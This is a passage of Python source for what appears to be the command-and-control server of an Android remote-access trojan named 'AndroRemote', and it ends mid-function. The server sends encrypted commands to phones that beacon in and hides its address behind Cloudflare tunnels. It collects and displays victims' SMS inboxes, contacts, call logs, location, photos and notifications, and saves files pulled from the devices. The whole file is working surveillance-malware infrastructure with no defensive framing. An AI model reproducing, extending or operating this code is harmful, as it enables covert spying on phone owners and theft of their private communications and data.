#!/usr/bin/env python3
"""AndroRemote C2 server with modular plugin architecture."""

import argparse
import base64
import hashlib
import json
import os
import re
import shlex
import shutil
import ssl
import subprocess
import sys
import threading
import time
from collections import deque
from datetime import datetime
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from urllib.parse import parse_qs, urlparse
import cmd
import readline
from cryptography.exceptions import InvalidTag
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from rich import box
from rich.console import Console
from rich.markup import escape
from rich.panel import Panel
from rich.progress import BarColumn, Progress, SpinnerColumn, TextColumn
from rich.rule import Rule
from rich.table import Table
from rich.text import Text

from androremote.plugins.base import PluginContext
from androremote.plugins.manager import PluginManager


class ResultCache:
    """Thread-safe in-memory TTL cache for agent query results."""

    def __init__(self, default_ttl: float = 60.0):
        self._cache = {}
        self._lock = threading.Lock()
        self.default_ttl = default_ttl

    def get(self, cid: str, cmd_str: str):
        with self._lock:
            key = (cid, cmd_str.strip().upper())
            entry = self._cache.get(key)
            if not entry:
                return None
            ts, val = entry
            if time.time() - ts > self.default_ttl:
                del self._cache[key]
                return None
            return val

    def set(self, cid: str, cmd_str: str, val):
        with self._lock:
            key = (cid, cmd_str.strip().upper())
            self._cache[key] = (time.time(), val)

    def invalidate(self, cid: str = None) -> int:
        with self._lock:
            if cid is None:
                cnt = len(self._cache)
                self._cache.clear()
                return cnt
            keys_to_del = [k for k in self._cache if k[0] == cid]
            for k in keys_to_del:
                del self._cache[k]
            return len(keys_to_del)

    def items(self):
        with self._lock:
            now = time.time()
            res = []
            for (cid, cmd_str), (ts, val) in list(self._cache.items()):
                age = now - ts
                if age <= self.default_ttl:
                    res.append({
                        "cid": cid,
                        "cmd": cmd_str,
                        "age": age,
                        "size": len(str(val)) if val else 0,
                    })
            return res


CACHE = ResultCache(default_ttl=60.0)
CACHEABLE_CMDS = {
    "INFO", "ID", "PERMS", "APPS", "CONTACTS", "NOTIFS",
    "LOC", "CALLLOG", "PHOTOS", "SMSIN", "LOG", "SMSLOG"
}
PORT_DEFAULT = 8742
BEACON_TIMEOUT = 75
HOME_DIR = os.path.expanduser("~/.androremote")
KEY_FILE = os.path.join(HOME_DIR, "c2.key")
CERT_FILE = os.path.join(HOME_DIR, "c2cert.pem")
CERT_KEY_FILE = os.path.join(HOME_DIR, "c2key.pem")
TUNNEL_FILE = os.path.join(HOME_DIR, "tunnel.json")
ALIASES_FILE = os.path.join(HOME_DIR, "aliases.json")
LOG_FILE = os.path.join(HOME_DIR, "c2.log")
HISTORY_FILE = os.path.join(HOME_DIR, "history")
ENC_PREFIX = "ENC1:"

console = Console(highlight=False, soft_wrap=False)
CLIENTS = {}  # id -> {model, last_seen, pending(deque), result, seq, last_cmd}
LOCK = threading.Lock()
ACTIVE = {"id": None}
STARTED = time.time()
PSK = None           # 32-byte AES-256 key or None
TLS = False
TUNNEL = {"proc": None, "url": None, "mode": None, "run": False}
ALIASES = {}
PLUGIN_MANAGER = None
ARGS = None


# ────────────────────────────── crypto layer ──────────────────────────

def load_key(create=True):
    global PSK
    os.makedirs(HOME_DIR, exist_ok=True)
    if os.path.isfile(KEY_FILE):
        PSK = bytes.fromhex(open(KEY_FILE).read().strip())
    elif create:
        PSK = AESGCM.generate_key(bit_length=256)
        with open(KEY_FILE, "w") as f:
            f.write(PSK.hex())
        os.chmod(KEY_FILE, 0o600)
    return PSK


def key_fp():
    if not PSK:
        return "-"
    return hashlib.sha256(PSK).hexdigest()[:12]


def enc_wire(plaintext: str) -> str:
    """Frame a payload for the agent: 'ENC1:' + b64(12B nonce || AESGCM ct)."""
    if PSK is None:
        return plaintext
    nonce = os.urandom(12)
    ct = AESGCM(PSK).encrypt(nonce, plaintext.encode("utf-8"), None)
    return ENC_PREFIX + base64.b64encode(nonce + ct).decode()


def dec_wire(body: str):
    """Decrypt an agent payload. Returns plaintext str, or None on auth failure."""
    if body.startswith(ENC_PREFIX):
        if PSK is None:
            return None
        try:
            raw = base64.b64decode(body[len(ENC_PREFIX):])
            return AESGCM(PSK).decrypt(raw[:12], raw[12:], None).decode("utf-8", "replace")
        except (InvalidTag, ValueError, KeyError):
            return None
    return body  # legacy / unencrypted agent


# ────────────────────────────── TLS listener ──────────────────────────

def ensure_cert():
    """Self-signed cert for --tls (LAN/https agents pin its fingerprint)."""
    from cryptography import x509
    from cryptography.hazmat.primitives.asymmetric import ec
    from cryptography.hazmat.primitives.serialization import Encoding, NoEncryption, PrivateFormat
    from cryptography.x509.oid import NameOID
    import datetime as dt

    if os.path.isfile(CERT_FILE) and os.path.isfile(CERT_KEY_FILE):
        return CERT_FILE
    key = ec.generate_private_key(ec.SECP256R1())
    name = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, "androremote-c2")])
    cert = (
        x509.CertificateBuilder()
        .subject_name(name)
        .issuer_name(name)
        .public_key(key.public_key())
        .serial_number(x509.random_serial_number())
        .not_valid_before(dt.datetime.now(dt.timezone.utc) - dt.timedelta(days=1))
        .not_valid_after(dt.datetime.now(dt.timezone.utc) + dt.timedelta(days=3650))
        .add_extension(
            x509.SubjectAlternativeName(
                [x509.DNSName("localhost"), x509.IPAddress(__import__("ipaddress").ip_address("127.0.0.1"))]
            ),
            critical=False,
        )
        .sign(key, hashes.SHA256())
    )
    with open(CERT_FILE, "wb") as f:
        f.write(cert.public_bytes(Encoding.PEM))
    with open(CERT_KEY_FILE, "wb") as f:
        f.write(key.private_bytes(Encoding.PEM, PrivateFormat.TraditionalOpenSSL, NoEncryption()))
    os.chmod(CERT_KEY_FILE, 0o600)
    return CERT_FILE


def cert_pin():
    """SHA-256 hex of the cert DER — the value agents bake as c2_pin."""
    with open(CERT_FILE, "rb") as f:
        der = ssl.PEM_cert_to_DER_cert(f.read().decode("ascii", "strict"))
    return hashlib.sha256(der).hexdigest()


# ────────────────────────────── C2 core ───────────────────────────────

class Handler(BaseHTTPRequestHandler):
    def log_message(self, *a):
        pass

    def _send(self, code, body=b""):
        self.send_response(code)
        self.send_header("Content-Type", "text/plain; charset=utf-8")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        if body:
            self.wfile.write(body)

    def _pop_pending(self, cid):
        with LOCK:
            c = CLIENTS.get(cid)
            if not c or not c["pending"]:
                return None
            cmd = c["pending"].popleft()
            c["last_cmd"] = cmd
            return cmd

    def do_GET(self):
        u = urlparse(self.path)
        m = re.match(r"^/b/([A-Za-z0-9_-]+)$", u.path)
        if not m:
            return self._send(404)
        cid = m.group(1)
        model = parse_qs(u.query).get("model", [""])[0]
        client_ip = self.client_address[0] if self.client_address else "unknown"
        with LOCK:
            c = CLIENTS.setdefault(
                cid, {"model": "", "last_seen": 0, "pending": deque(), "result": None, "seq": 0, "last_cmd": None}
            )
            fresh = c["seq"] == 0 and c["last_seen"] == 0
            c["last_seen"] = time.time()
            c["model"] = model or c["model"]
            cmd = c["pending"].popleft() if c["pending"] else None
            if cmd:
                c["last_cmd"] = cmd

        if fresh:
            ev(
                "+",
                f"new session [cyan bold]{alias_tag(cid)}[/cyan bold]"
                + (f"  ([dim]{c['model']}[/dim])" if c["model"] else ""),
                "green",
            )
            if PLUGIN_MANAGER:
                PLUGIN_MANAGER.trigger_hook("on_client_connect", cid, {"model": c["model"], "ip": client_ip})

        if PLUGIN_MANAGER:
            PLUGIN_MANAGER.trigger_hook("on_beacon", cid, {"model": c["model"], "ip": client_ip})

        if cmd:
            self._send(200, enc_wire(cmd).encode())
        else:
            self._send(204)

    def do_POST(self):
        m = re.match(r"^/r/([A-Za-z0-9_-]+)$", urlparse(self.path).path)
        if not m:
            return self._send(404)
        n = int(self.headers.get("Content-Length") or 0)
        body = self.rfile.read(n).decode("utf-8", "replace")
        cid = m.group(1)
        result = dec_wire(body)
        if result is None:
            ev("!", f"dropped result from [cyan]{alias_tag(cid)}[/cyan]: decryption failed (key mismatch?)", "yellow")
            return self._send(400)
        with LOCK:
            c = CLIENTS.setdefault(
                cid, {"model": "", "last_seen": 0, "pending": deque(), "result": None, "seq": 0, "last_cmd": None}
            )
            c["result"] = result
            c["enc"] = body.startswith(ENC_PREFIX)
            c["seq"] += 1
            c["last_seen"] = time.time()
            last_cmd = c.get("last_cmd") or ""
            if last_cmd:
                op_base = last_cmd.split()[0].upper()
                if op_base in CACHEABLE_CMDS and not result.startswith("ERR"):
                    CACHE.set(cid, last_cmd, result)

        if PLUGIN_MANAGER:
            client_ip = self.client_address[0] if self.client_address else "unknown"
            PLUGIN_MANAGER.trigger_hook("on_result", cid, last_cmd, result)
            PLUGIN_MANAGER.trigger_hook("on_beacon", cid, {"ip": client_ip})

        # pipelining: hand next queued command back with ack
        nxt = self._pop_pending(cid)
        self._send(200, enc_wire(nxt).encode()) if nxt else self._send(200)


def b64s(s):
    return base64.b64encode(s.encode()).decode()


def queue(cid, cmd):
    with LOCK:
        c = CLIENTS.setdefault(
            cid, {"model": "", "last_seen": 0, "pending": deque(), "result": None, "seq": 0, "last_cmd": None}
        )
        c["pending"].append(cmd)
    if PLUGIN_MANAGER:
        PLUGIN_MANAGER.trigger_hook("on_command_queued", cid, cmd)


def send_and_wait(cmd, client_id=None, timeout=BEACON_TIMEOUT, use_cache=True, force_refresh=False):
    cid = client_id or ACTIVE["id"]
    if not cid:
        ev("!", "no active session — run: /use", "yellow")
        return None
    with LOCK:
        c = CLIENTS.get(cid)
        if not c:
            return None
        seq = c["seq"]
    tag = alias_tag(cid)
    op_name = cmd.split()[0].upper()

    if use_cache and not force_refresh and op_name in CACHEABLE_CMDS:
        cached = CACHE.get(cid, cmd)
        if cached is not None:
            ev("⚡", f"using cached response for [cyan]{op_name}[/cyan]  [dim]({tag} · add --refresh to update)[/dim]", "dim cyan")
            return cached

    ev(">", f"dispatch to [cyan bold]{tag}[/cyan bold]  [dim]{cmd[:64]}[/dim]", "magenta")
    queue(cid, cmd)
    t0 = time.time()
    with console.status(
        f"[cyan]Waiting for beacon from [bold]{escape(tag)}[/bold] ([magenta]{escape(op_name)}[/magenta])...[/cyan]",
        spinner="dots",
    ) as status:
        while time.time() - t0 < timeout:
            elapsed = int(time.time() - t0)
            if elapsed > 1:
                status.update(f"[cyan]Waiting for beacon from [bold]{escape(tag)}[/bold] ([magenta]{escape(op_name)}[/magenta]) [dim][{elapsed}s][/dim]...[/cyan]")
            with LOCK:
                c = CLIENTS.get(cid)
                if c and c["seq"] > seq and c["result"] is not None:
                    res = c["result"]
                    if op_name in CACHEABLE_CMDS and not res.startswith("ERR"):
                        CACHE.set(cid, cmd, res)
                    return res
            time.sleep(0.2)
    ev("!", f"timeout after {timeout}s — [cyan]{tag}[/cyan] may be offline", "yellow")
    return None

# ────────────────────────── tunnel management ─────────────────────────

CF_CONFIG = os.path.expanduser("~/.cloudflared/config.yml")


def tunnel_named_cfg():
    try:
        cfg = json.load(open(TUNNEL_FILE))
        return cfg if cfg.get("id") and cfg.get("hostname") else None
    except Exception:
        return None


def ensure_named_ingress(cfg, port):
    """Rewrite cloudflared config.yml so `tunnel run` routes hostname -> C2 port."""
    try:
        os.makedirs(os.path.dirname(CF_CONFIG), exist_ok=True)
        with open(CF_CONFIG, "w") as f:
            f.write(
                f"tunnel: {cfg['id']}\n"
                f"credentials-file: {cfg['credentials']}\n"
                "ingress:\n"
                f"  - hostname: {cfg['hostname']}\n"
                f"    service: http://127.0.0.1:{port}\n"
                "  - service: http_status:404\n"
            )
    except Exception as e:
        ev("!", f"could not write {CF_CONFIG}: {e}", "yellow")


def _tunnel_supervisor(mode):
    """Keep cloudflared alive; restarts it (with backoff) if it dies."""
    backoff = 2
    port = ARGS.port if ARGS else PORT_DEFAULT
    while TUNNEL["run"]:
        cmd = None
        if mode == "named":
            cfg = tunnel_named_cfg()
            if cfg:
                ensure_named_ingress(cfg, port)
                cmd = ["cloudflared", "tunnel", "--no-autoupdate", "--config", CF_CONFIG, "run", cfg["id"]]
                TUNNEL["url"] = f"https://{cfg['hostname']}"
        elif mode == "quick":
            cmd = ["cloudflared", "tunnel", "--url", f"http://127.0.0.1:{port}", "--no-autoupdate"]
            TUNNEL["url"] = None
        if not cmd:
            time.sleep(2)
            continue
        try:
            p = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.PIPE, text=True)
            TUNNEL["proc"] = p
        except Exception as e:
            ev("!", f"cloudflared failed to start: {e}", "yellow")
            time.sleep(10)
            continue
        t0 = time.time()
        while TUNNEL["run"] and p.poll() is None:
            line = p.stderr.readline() if p.stderr else ""
            if not line:
                time.sleep(0.2)
                continue
            if mode == "quick" and TUNNEL["url"] is None:
                mm = re.search(r"https://[a-z0-9-]+\.trycloudflare\.com", line)
                if mm:
                    TUNNEL["url"] = mm.group(0)
                    ev(
                        "*",
                        f"quick tunnel live: [green]{TUNNEL['url']}[/green]  "
                        f"[dim](ephemeral — use --setup-tunnel for a stable URL)[/dim]",
                        "cyan",
                    )
            elif mode == "named" and "Registered tunnel connection" in line and time.time() - t0 < 60:
                pass
        if not TUNNEL["run"]:
            break
        ev("!", "cloudflared exited — restarting in 5s", "yellow")
        time.sleep(backoff)
        backoff = min(backoff * 2, 60)


def start_tunnel_thread(mode):
    TUNNEL["mode"] = mode
    TUNNEL["run"] = mode in ("named", "quick")
    if TUNNEL["run"]:
        threading.Thread(target=_tunnel_supervisor, args=(mode,), daemon=True).start()


def cmd_setup_tunnel(hostname):
    """One-time: create a named Cloudflare tunnel with a stable hostname."""
    if not shutil.which("cloudflared"):
        ev("!", "cloudflared not found — brew install cloudflared", "yellow")
        return
    cert = os.path.expanduser("~/.cloudflared/cert.pem")
    if not os.path.isfile(cert):
        ev("*", "opening browser for `cloudflared tunnel login` (authorize your zone, then return here)", "cyan")
        subprocess.run(["cloudflared", "tunnel", "login"])
        if not os.path.isfile(cert):
            ev("!", "login not completed — aborting", "yellow")
            return
    with console.status("[cyan]Creating named tunnel [bold]androremote[/bold]...[/cyan]", spinner="dots"):
        subprocess.run(["cloudflared", "tunnel", "create", "androremote"], capture_output=True)
    try:
        out = subprocess.run(
            ["cloudflared", "tunnel", "list", "--output", "json"],
            capture_output=True,
            text=True,
            check=True,
        ).stdout
        tunnels = json.loads(out or "[]")
        match = [t for t in tunnels if t.get("name") == "androremote"]
        if not match:
            ev("!", "tunnel 'androremote' not found after create", "yellow")
            return
        tid = match[0]["id"]
    except Exception as e:
        ev("!", f"could not resolve tunnel id: {e}", "yellow")
        return
    creds = os.path.expanduser(f"~/.cloudflared/{tid}.json")
    if not os.path.isfile(creds):
        ev("!", f"credentials file missing: {creds}", "yellow")
        return
    with console.status(f"[cyan]Routing DNS [bold]{hostname}[/bold] → tunnel...[/cyan]", spinner="dots"):
        r = subprocess.run(
            ["cloudflared", "tunnel", "route", "dns", "-f", "androremote", hostname],
            capture_output=True,
            text=True,
        )
    if r.returncode != 0:
        ev("!", f"DNS route failed: {(r.stderr or r.stdout).strip()}", "yellow")
        return
    os.makedirs(HOME_DIR, exist_ok=True)
    cfg = {"id": tid, "name": "androremote", "hostname": hostname, "credentials": creds}
    json.dump(cfg, open(TUNNEL_FILE, "w"), indent=2)
    ensure_named_ingress(cfg, ARGS.port if ARGS else PORT_DEFAULT)
    ok("persistent tunnel configured — survives server restarts")
    console.print(f"  [white bold]build agent[/white bold]  [cyan]./build.sh https://{hostname}[/cyan]")
    console.print("  [dim]start the server normally; the tunnel URL never changes now.[/dim]")


# ─────────────────────────── session display ──────────────────────────

def load_aliases():
    global ALIASES
    try:
        ALIASES = json.load(open(ALIASES_FILE))
    except Exception:
        ALIASES = {}


def save_aliases():
    json.dump(ALIASES, open(ALIASES_FILE, "w"), indent=2)


def alias_tag(cid):
    """cid, or alias if set."""
    return ALIASES.get(cid, cid)


def resolve_tag(tag):
    """Map a typed prefix (alias, id prefix, or list number) -> real cid."""
    if tag.isdigit():
        with LOCK:
            items = sorted(CLIENTS.items(), key=lambda kv: -kv[1]["last_seen"])
        if int(tag) < len(items):
            return items[int(tag)][0]
        return None
    matches = [
        cid
        for cid in CLIENTS
        if cid.startswith(tag) or ALIASES.get(cid, "") == tag or ALIASES.get(cid, "").startswith(tag)
    ]
    return matches[0] if len(matches) == 1 else None


def status_of(c):
    age = time.time() - c["last_seen"]
    if age <= 25:
        return ("bold green", "ONLINE", age)
    if age <= 90:
        return ("bold yellow", "IDLE  ", age)
    return ("bold red", "OFFLINE", age)


def fmt_age(secs):
    if secs < 60:
        return f"{int(secs)}s"
    if secs < 3600:
        return f"{int(secs) // 60}m{int(secs) % 60:02d}s"
    return f"{int(secs) // 3600}h{(int(secs) % 3600) // 60:02d}m"


def print_sessions():
    with LOCK:
        items = sorted(CLIENTS.items(), key=lambda kv: -kv[1]["last_seen"])
    if not items:
        ev("*", "no sessions yet — agents appear here on first beacon", "cyan")
        return
    online = sum(1 for _, c in items if time.time() - c["last_seen"] <= 25)
    t = Table(
        title=f"[bold cyan]SESSIONS[/bold cyan] [dim]· {len(items)} tracked · {online} online[/dim]",
        box=box.ROUNDED,
        pad_edge=False,
        show_header=True,
        header_style="bold magenta",
        border_style="dim",
        padding=(0, 1),
    )
    t.add_column("", width=1)
    t.add_column("#", width=2, style="dim", justify="right")
    t.add_column("ID / ALIAS", min_width=14, no_wrap=True, style="bold cyan")
    t.add_column("MODEL", max_width=18, no_wrap=True, style="white")
    t.add_column("STATUS", width=9)
    t.add_column("SEEN", min_width=6, style="dim", justify="right")
    t.add_column("PEND", width=4, justify="right")
    t.add_column("ENC", width=9, justify="center")
    t.add_column("RES", width=4, justify="center")
    for i, (cid, c) in enumerate(items):
        mark = "[bold green]●[/bold green]" if cid == ACTIVE["id"] else " "
        st_style, st, age = status_of(c)
        t.add_row(
            mark,
            str(i),
            alias_tag(cid),
            (c["model"] or "unknown")[:24],
            Text(st, style=st_style),
            fmt_age(age),
            str(len(c["pending"])) if c["pending"] else "-",
            "[green]AES-GCM[/green]" if c.get("enc") else "[dim]plain[/dim]",
            "[green]yes[/green]" if c["result"] else "[dim]-[/dim]",
        )
    console.print(t)
    console.print("  [dim]● active session · use [bold cyan]/use <id|alias|#>[/bold cyan] to select[/dim]\n")


def cmd_use(prefix=None):
    with LOCK:
        n = len(CLIENTS)
    if not n:
        return ev("!", "no sessions available", "yellow")
    target = None
    if prefix:
        target = resolve_tag(prefix)
        if not target:
            return ev("!", f"no unique session match: [bold]{escape(prefix)}[/bold]  (run: /sessions)", "yellow")
    else:
        print_sessions()
        try:
            pick = console.input("  [bold]select session # (enter to cancel): [/bold]").strip()
        except (EOFError, KeyboardInterrupt):
            console.print()
            return
        if not pick:
            return ev("*", "cancelled", "cyan")
        target = resolve_tag(pick)
        if not target:
            return ev("!", f"no match: {pick}", "yellow")
    ACTIVE["id"] = target
    queue(target, "FASTPOLL 45")
    with LOCK:
        model = CLIENTS[target]["model"]
    ev(
        "●",
        f"active session → [cyan bold]{alias_tag(target)}[/cyan bold]"
        + (f" [dim]({model})[/dim]" if model else "")
        + "  [dim]fastpoll armed[/dim]",
        "green",
    )


def cmd_broadcast(op):
    with LOCK:
        ids = list(CLIENTS.keys())
    if not ids:
        return ev("!", "no sessions", "yellow")
    for cid in ids:
        queue(cid, op)
    ev("»", f"broadcast [bold]{op}[/bold] → {len(ids)} session(s)  [dim]watch: results[/dim]", "magenta")


def cmd_results():
    with LOCK:
        items = sorted(CLIENTS.items(), key=lambda kv: -kv[1]["last_seen"])
    if not items:
        return ev("!", "no sessions", "yellow")
    console.print(Rule("LAST RESULTS", style="dim"))
    for cid, c in items:
        r = c["result"]
        tag = alias_tag(cid)
        if not r:
            first = "[dim]<none>[/dim]"
        else:
            first_line = r.splitlines()[0][:90]
            if r.startswith("ERR"):
                first = f"[bold red]✗[/bold red] [red]{escape(first_line)}[/red]"
            elif r.startswith(("OK", "PONG")):
                first = f"[bold green]✓[/bold green] [green]{escape(first_line)}[/green]"
            else:
                first = escape(first_line)
        console.print(f"  [cyan bold]{escape(tag):<20}[/cyan bold] {first}")
    console.print()


def cmd_status():
    with LOCK:
        n = len(CLIENTS)
        online = sum(1 for c in CLIENTS.values() if status_of(c)[1].strip() == "ONLINE")
    up = int(time.time() - STARTED)
    upstr = (
        f"{up // 3600}h{(up % 3600) // 60:02d}m{up % 60:02d}s" if up >= 3600 else f"{up // 60}m{up % 60:02d}s"
    )
    tmode = TUNNEL["mode"] or "off"
    tstate = (
        {"off": "[dim]off[/dim]"}.get(
            tmode,
            f"[green bold]{TUNNEL['url']}[/green bold]" if TUNNEL.get("url") else "[dim]connecting…[/dim]",
        )
    )

    t = Table(
        title="[bold cyan]C2 SERVER STATUS[/bold cyan]",
        box=box.ROUNDED,
        show_header=False,
        border_style="dim",
        padding=(0, 1),
        expand=False,
    )
    t.add_column("Property", style="bold cyan", no_wrap=True)
    t.add_column("Value", style="white")

    port = ARGS.port if ARGS else PORT_DEFAULT
    t.add_row(
        "Listener",
        f"0.0.0.0:{port}  "
        + (f"[green bold]TLS[/green bold] [dim](pin: {cert_pin()[:12]}…)[/dim]" if TLS else "[yellow](cleartext)[/yellow]"),
    )
    t.add_row("Tunnel", f"{tstate}" + (f" [dim]({tmode} · supervised)[/dim]" if tmode != "off" else ""))
    t.add_row(
        "Encryption",
        f"[green bold]AES-256-GCM[/green bold] [dim](key: {key_fp()}…)[/dim]"
        if PSK
        else "[yellow]disabled[/yellow] [dim](--no-enc)[/dim]",
    )
    t.add_row("Uptime", upstr)
    t.add_row(
        "Sessions",
        f"[bold white]{n}[/bold white] tracked · [bold green]{online}[/bold green] online · active: [bold cyan]{alias_tag(ACTIVE['id']) if ACTIVE['id'] else 'none'}[/bold cyan]",
    )
    if PLUGIN_MANAGER:
        pcount = len(PLUGIN_MANAGER.plugins)
        cmdcount = len(PLUGIN_MANAGER.commands)
        t.add_row("Plugins", f"[bold cyan]{pcount}[/bold cyan] loaded ({cmdcount} custom commands)")
    cached_count = len(CACHE.items())
    t.add_row("Cache", f"[bold cyan]{cached_count}[/bold cyan] response(s) in-memory [dim](TTL: {int(CACHE.default_ttl)}s · /cache)[/dim]")

    console.print(t)
    console.print()


# ─────────────────────────── result rendering ─────────────────────────

def show_result(text):
    if text is None or not text.strip():
        console.print("  [dim](no response data)[/dim]")
        return
    lines = text.splitlines()
    if len(lines) == 1:
        ln = lines[0]
        if ln.startswith("ERR"):
            console.print(f"  [bold red]✗[/bold red] [red]{escape(ln)}[/red]")
        elif ln.startswith("PONG"):
            console.print(f"  [bold green]●[/bold green] [bold green]{escape(ln)}[/bold green]")
        elif ln.startswith("OK"):
            console.print(f"  [bold green]✓[/bold green] [green]{escape(ln)}[/green]")
        else:
            console.print(f"  {escape(ln)}")
        return

    first = lines[0]
    rest = lines[1:]
    if first.startswith("ERR"):
        console.print(f"  [bold red]✗[/bold red] [red bold]{escape(first)}[/red bold]")
        for ln in rest:
            console.print(f"    [red dim]{escape(ln)}[/red dim]")
    elif first.startswith("OK"):
        console.print(f"  [bold green]✓[/bold green] [green bold]{escape(first)}[/green bold]")
        for ln in rest:
            if ": granted" in ln:
                k, _ = ln.split(": granted", 1)
                console.print(f"    [white]{escape(k)}[/white]: [green bold]granted[/green bold]")
            elif ": denied" in ln:
                k, _ = ln.split(": denied", 1)
                console.print(f"    [white]{escape(k)}[/white]: [red]denied[/red]")
            elif ln.endswith("/"):
                console.print(f"    [cyan bold]{escape(ln)}[/cyan bold]")
            else:
                console.print(f"    [white]{escape(ln)}[/white]")
    else:
        if len(lines) > 25 and sys.stdin.isatty():
            rows = [(str(i), escape(ln)) for i, ln in enumerate(lines, 1)]
            columns = [
                ("#", {"style": "dim", "width": 5, "justify": "right"}),
                ("Output", {"style": "white"}),
            ]
            show_paginated_table("COMMAND OUTPUT", columns, rows, page_size=25)
        else:
            for ln in lines:
                console.print(f"  {escape(ln)}")

def ok(msg):
    ev("✓", msg, "green")


def err(msg):
    ev("✗", msg, "red")


def usage(msg):
    ev("!", f"usage: [bold cyan]/{msg}[/bold cyan]", "yellow")


def download_b64(r, dest):
    parts = r.split(" ", 2)
    if len(parts) == 3 and parts[0] == "OK":
        b64_str = parts[2]
        data = base64.b64decode(b64_str + "=" * (-len(b64_str) % 4))
        total_len = len(data)
        dest_name = os.path.basename(dest)
        with Progress(
            SpinnerColumn(spinner_name="dots", style="cyan"),
            TextColumn(f"[bold cyan]Saving [white]{escape(dest_name)}[/white][/bold cyan]"),
            BarColumn(bar_width=25, style="dim", complete_style="bold cyan"),
            TextColumn("[bold green]{task.completed:,}[/bold green]/{task.total:,} bytes"),
            console=console,
            transient=True,
        ) as progress:
            task = progress.add_task("Saving", total=total_len)
            chunk_size = 65536
            with open(dest, "wb") as f:
                for offset in range(0, total_len, chunk_size):
                    chunk = data[offset:offset + chunk_size]
                    f.write(chunk)
                    progress.advance(task, len(chunk))
        ok(f"{total_len:,} bytes → [cyan]{escape(dest)}[/cyan]")
        return True
    show_result(r)
    return False

# ─────────────────────────── data formatting & pagination ─────────────────

def show_paginated_table(title, columns, rows, page_size=20, start_page=1):
    """Render structured data in a Rich Table with interactive pagination."""
    if not rows:
        t = Table(title=f"[bold cyan]{title}[/bold cyan]", box=box.ROUNDED, border_style="cyan", header_style="bold magenta", expand=True)
        for col in columns:
            name = col[0] if isinstance(col, (tuple, list)) else col
            t.add_column(name)
        t.add_row(*["[dim]<none>[/dim]"] * len(columns))
        console.print(t)
        return

    total = len(rows)
    total_pages = max(1, (total + page_size - 1) // page_size)
    cur_page = max(1, min(total_pages, start_page))
    is_interactive = sys.stdin.isatty() and sys.stdout.isatty()

    while True:
        start_idx = (cur_page - 1) * page_size
        end_idx = min(start_idx + page_size, total)
        page_rows = rows[start_idx:end_idx]

        page_str = f" [dim]· Page {cur_page}/{total_pages} ({total} total)[/dim]" if total_pages > 1 else f" [dim]· {total} items[/dim]"
        t = Table(
            title=f"[bold cyan]{title}[/bold cyan]{page_str}",
            box=box.ROUNDED,
            border_style="cyan",
            header_style="bold magenta",
            padding=(0, 1),
            expand=True,
        )
        for col in columns:
            if isinstance(col, (tuple, list)):
                cname = col[0]
                ckwargs = col[1] if len(col) > 1 and isinstance(col[1], dict) else {"style": col[1]} if len(col) > 1 else {}
                t.add_column(cname, **ckwargs)
            else:
                t.add_column(str(col))

        for r in page_rows:
            t.add_row(*[str(cell) for cell in r])

        console.print(t)

        if total_pages <= 1 or not is_interactive:
            break

        if cur_page >= total_pages:
            console.print(f"  [dim]── End of list ({total} items) ──[/dim]\n")
            break

        remaining = total - end_idx
        prompt_str = f"  [cyan bold]Next page ({remaining} more)?[/cyan bold] [dim]Enter: next · a: all · q: quit · #jump: [/dim]"
        try:
            choice = console.input(prompt_str).strip().lower()
        except (EOFError, KeyboardInterrupt):
            console.print()
            break
        if choice in ("q", "quit", "exit"):
            break
        elif choice in ("a", "all"):
            cur_page += 1
            is_interactive = False
        elif choice.isdigit():
            target_p = int(choice)
            if 1 <= target_p <= total_pages:
                cur_page = target_p
            else:
                cur_page += 1
        else:
            cur_page += 1


def format_smsin(raw_text, page=1):
    if not raw_text or raw_text.startswith("ERR"):
        show_result(raw_text)
        return
    lines = [ln.strip() for ln in raw_text.splitlines() if ln.strip()]
    if lines and lines[0].startswith("OK"):
        lines[0] = lines[0][3:].strip()
    lines = [ln for ln in lines if ln]

    rows = []
    for idx, ln in enumerate(lines, 1):
        parts = ln.split(" ")
        if len(parts) >= 7:
            addr = parts[0]
            date_str = " ".join(parts[1:7])
            body = " ".join(parts[7:])
        elif len(parts) >= 2:
            addr = parts[0]
            date_str = parts[1]
            body = " ".join(parts[2:])
        else:
            addr = "?"
            date_str = "-"
            body = ln
        rows.append((str(idx), escape(addr), escape(date_str), escape(body)))

    columns = [
        ("#", {"style": "dim", "width": 4}),
        ("From", {"style": "bold cyan", "width": 16}),
        ("Date", {"style": "dim", "width": 26}),
        ("Message", {"style": "white"}),
    ]
    show_paginated_table("INBOX SMS MESSAGES", columns, rows, page_size=15, start_page=page)


def format_contacts(raw_text, page=1):
    if not raw_text or raw_text.startswith("ERR"):
        show_result(raw_text)
        return
    lines = [ln.strip() for ln in raw_text.splitlines() if ln.strip()]
    if lines and lines[0].startswith("OK"):
        lines[0] = lines[0][3:].strip()
    lines = [ln for ln in lines if ln]

    rows = []
    for idx, ln in enumerate(lines, 1):
        if " | " in ln:
            name, num = ln.split(" | ", 1)
        else:
            name, num = ln, ""
        rows.append((str(idx), escape(name.strip()), escape(num.strip())))

    columns = [
        ("#", {"style": "dim", "width": 4}),
        ("Contact Name", {"style": "bold white", "width": 28}),
        ("Phone Number", {"style": "green"}),
    ]
    show_paginated_table("DEVICE CONTACTS", columns, rows, page_size=20, start_page=page)


def format_calllog(raw_text, page=1):
    if not raw_text or raw_text.startswith("ERR"):
        show_result(raw_text)
        return
    lines = [ln.strip() for ln in raw_text.splitlines() if ln.strip()]
    if lines and lines[0].startswith("OK"):
        lines[0] = lines[0][3:].strip()
    lines = [ln for ln in lines if ln]

    rows = []
    for idx, ln in enumerate(lines, 1):
        parts = ln.split(" ")
        if len(parts) >= 8:
            raw_type = parts[0]
            number = parts[1]
            date_str = " ".join(parts[2:8])
            dur = parts[8] if len(parts) > 8 else "-"
        elif len(parts) >= 3:
            raw_type = parts[0]
            number = parts[1]
            date_str = parts[2]
            dur = parts[3] if len(parts) > 3 else "-"
        else:
            raw_type = "-"
            number = ln
            date_str = "-"
            dur = "-"

        if raw_type == "in":
            type_badge = "[bold green]INCOMING[/bold green]"
        elif raw_type == "out":
            type_badge = "[bold cyan]OUTGOING[/bold cyan]"
        elif raw_type == "missed":
            type_badge = "[bold red]MISSED[/bold red]"
        else:
            type_badge = f"[yellow]{escape(raw_type)}[/yellow]"

        rows.append((str(idx), type_badge, escape(number), escape(date_str), escape(dur)))

    columns = [
